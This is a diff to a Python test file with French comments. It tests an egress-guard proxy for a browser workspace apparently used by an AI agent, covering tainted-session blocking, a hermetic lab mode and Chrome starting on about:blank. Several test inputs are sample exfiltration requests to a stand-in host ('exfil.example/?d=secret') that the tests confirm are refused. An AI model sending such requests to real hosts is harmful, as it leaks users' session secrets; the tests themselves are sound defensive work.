@@ -337,11 +337,11 @@ def test_browser_service_endpoints_are_refused_before_any_connection():
         assert not web_guard.browser_service(page_resource)
 
 
-def _workspace_proxy(lab_origin: str):
+def _workspace_proxy(lab_origin: str | None):
     """Le vrai garde de l'espace de travail derrière le vrai proxy (sans navigateur)."""
     from octopus import browser_workspace as bw
     space = bw.Workspace(bw.Scope("guard", "octopus", None), web_guard.BrowseState())
-    space.lab = {bw._origin(lab_origin)}
+    space.lab = {bw._origin(lab_origin)} if lab_origin else set()
     proxy = web_guard.GuardProxy(space._guard, allow_private=space._allow_private)
     connects = []
     real_connect = proxy._connect
@@ -373,7 +373,7 @@ def test_authenticated_session_data_cannot_leave_to_a_public_domain(upstream, ec
     monkeypatch.setattr(web_guard, "_resolved_ips", lambda host: [ipaddress.ip_address(  # pas de DNS réel
         "127.0.0.1" if host == "127.0.0.1" else "93.184.216.34")])
     lab = f"http://127.0.0.1:{upstream}"
-    space, proxy, connects = _workspace_proxy(lab)
+    space, proxy, connects = _workspace_proxy(None)  # mission normale : le public est joignable
     proxy._connect = lambda host, port: connects.append((host, port)) or socket.create_connection(
         ("127.0.0.1", echo))
     with proxy:
@@ -392,8 +392,62 @@ def test_authenticated_session_data_cannot_leave_to_a_public_domain(upstream, ec
         before = len(connects)
         for raw in (b"CONNECT exfil.example:443 HTTP/1.1\r\n\r\n",
                     b"GET http://exfil.example/?d=secret HTTP/1.1\r\n\r\n",
+                    b"CONNECT www.google.com:443 HTTP/1.1\r\n\r\n",
                     f"GET {lab}/ HTTP/1.1\r\n\r\n".encode()):
             assert _request(proxy, raw).startswith(b"HTTP/1.1 403"), raw
         assert len(connects) == before  # aucune nouvelle connexion amont
         public.close()
     assert "https://exfil.example/" in proxy.blocked and "http://exfil.example/?d=secret" in proxy.blocked
+
+
+def test_chrome_starts_on_about_blank_instead_of_the_new_tab_page(monkeypatch, tmp_path):
+    """La page Nouvel onglet de Chrome for Testing contacte www.google.com, www.gstatic.com et
+    ogads-pa.clients6.google.com d'elle-même (constaté sous Windows) : elle n'est jamais ouverte."""
+    session = _argv_session(monkeypatch, tmp_path, extra_args=("--lang=fr",))
+    args = session._global_args()
+    launch = args[args.index("--args") + 1].split(",")
+    assert launch[-1] == agent_browser.STARTUP_URL == "about:blank" and "--lang=fr" in launch
+
+
+def test_hermetic_lab_refuses_every_undeclared_origin_before_any_connection(upstream, monkeypatch):
+    import ipaddress
+    # DNS « public » simulé : sans le mode hermétique, ces domaines seraient autorisés.
+    monkeypatch.setattr(web_guard, "_resolved_ips", lambda host: [ipaddress.ip_address("142.250.74.36")])
+    lab = f"http://127.0.0.1:{upstream}"
+    space, proxy, connects = _workspace_proxy(lab)
+    with proxy:
+        for raw in (b"CONNECT www.google.com:443 HTTP/1.1\r\n\r\n",  # page Nouvel onglet (Windows)
+                    b"CONNECT www.gstatic.com:443 HTTP/1.1\r\n\r\n",
+                    b"CONNECT ogads-pa.clients6.google.com:443 HTTP/1.1\r\n\r\n",
+                    b"GET http://example.com/beacon HTTP/1.1\r\n\r\n",
+                    b"CONNECT 127.0.0.1:9 HTTP/1.1\r\n\r\n",  # autre port local, non déclaré
+                    b"CONNECT clients2.google.com:443 HTTP/1.1\r\n\r\n"):  # service du navigateur
+            assert _request(proxy, raw).startswith(b"HTTP/1.1 403"), raw
+        assert connects == []  # refus avant toute connexion amont, sans même une résolution DNS
+        ok = _request(proxy, f"GET {lab}/page HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
+    assert ok.split(b"\r\n")[0].endswith(b"200 OK") and proxy.allowed_urls == [f"{lab}/page"]
+    assert proxy.blocked == ["https://www.google.com/", "https://www.gstatic.com/",
+                             "https://ogads-pa.clients6.google.com/", "http://example.com/beacon",
+                             "https://127.0.0.1:9/"]
+    assert proxy.browser_internal == ["https://clients2.google.com/"]
+    from octopus import browser_workspace as bw
+    with pytest.raises(bw.Refused, match="hermétique"):
+        space.navigate("https://www.google.com/")
+
+
+def test_normal_missions_keep_google_web_domains_reachable(monkeypatch):
+    """Hors laboratoire, www.google.com et www.gstatic.com restent des domaines légitimes ;
+    ogads-pa.clients6.google.com (API OneGoogle, aussi appelée par Gmail, Docs, Gemini) n'est pas
+    un service exclusif du navigateur et suit donc le garde normal (taint des comptes compris)."""
+    import ipaddress
+    from octopus import browser_workspace as bw
+    monkeypatch.delenv(bw.LAB_ORIGINS_ENV, raising=False)
+    monkeypatch.setattr(web_guard, "_resolved_ips", lambda host: [ipaddress.ip_address("142.250.74.36")])
+    space = bw.Workspace(bw.Scope("normal", "octopus", None), web_guard.BrowseState())
+    assert not space.lab
+    for url in ("https://www.google.com/search?q=traduction", "https://www.gstatic.com/images/x.png",
+                "https://ogads-pa.clients6.google.com/"):
+        assert not web_guard.browser_service(url)
+        assert space._guard(url) is True
+    space.state.account_read = True
+    assert space._guard("https://www.google.com/") is False  # après lecture d'un compte : plus rien
